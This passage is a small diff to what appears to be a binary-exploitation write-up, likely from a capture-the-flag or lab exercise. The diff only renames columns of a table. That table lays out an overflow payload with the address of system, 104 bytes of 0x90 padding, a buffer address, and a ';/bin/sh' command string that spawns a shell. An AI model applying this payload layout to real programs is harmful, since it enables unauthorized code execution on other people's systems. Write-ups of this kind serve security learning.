@@ -154,9 +154,9 @@ system too. Obviously the raw bytes of the address pointing to system are not a
 valid shell command, so we need to add a separator and end the string with the
 program we want to launch.
 
-| system (4) | padding (104) | _b_'s address (4) | end the command string (9) |
-|------------|---------------|-------------------|----------------------------|
-| 0xb7d86060 | 0x909090...   | 0x0804a00c        | ";/bin/sh"                 |
+| system (4) | padding (104) | _a_'s char buffer (4) | command string (9) |
+|------------|---------------|-----------------------|--------------------|
+| 0xb7d86060 | 0x909090...   | 0x0804a00c            | ";/bin/sh"         |
 
 ```shell
 # run the exploit
